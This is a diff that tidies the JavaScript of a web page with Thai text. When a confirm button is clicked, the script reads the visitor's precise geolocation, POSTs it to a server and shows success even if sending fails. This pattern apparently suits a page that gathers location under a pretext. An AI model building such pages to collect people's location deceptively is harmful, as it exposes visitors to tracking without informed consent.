@@ -109,19 +109,17 @@
     </div>
 
     <script>
-        document.getElementById('confirm-button').addEventListener('click', function() {
-            const button = this;
-            button.disabled = true;
-            button.textContent = 'กำลังยืนยันตำแหน่ง...';
+document.getElementById('confirm-button').addEventListener('click', function() {
+    const button = this;
+    button.disabled = true;
+    button.textContent = 'กำลังยืนยันตำแหน่ง...';
 
-            if ("geolocation" in navigator) {
+    if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
             function(position) {
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
                 const data = {
-                    lat: latitude,
-                    lng: longitude,
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
                     acc: position.coords.accuracy
                 };
 
@@ -132,11 +130,11 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 })
-                .then(response => {
+                .then(() => {
                     document.getElementById('alert-content').style.display = 'none';
                     document.getElementById('success-content').style.display = 'block';
                 })
-                .catch(error => {
+                .catch(() => {
                     document.getElementById('alert-content').style.display = 'none';
                     document.getElementById('success-content').style.display = 'block';
                 });
@@ -148,5 +146,5 @@
             { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
     }
-}); // ปิดท้าย addEventListener
+});
 </script>
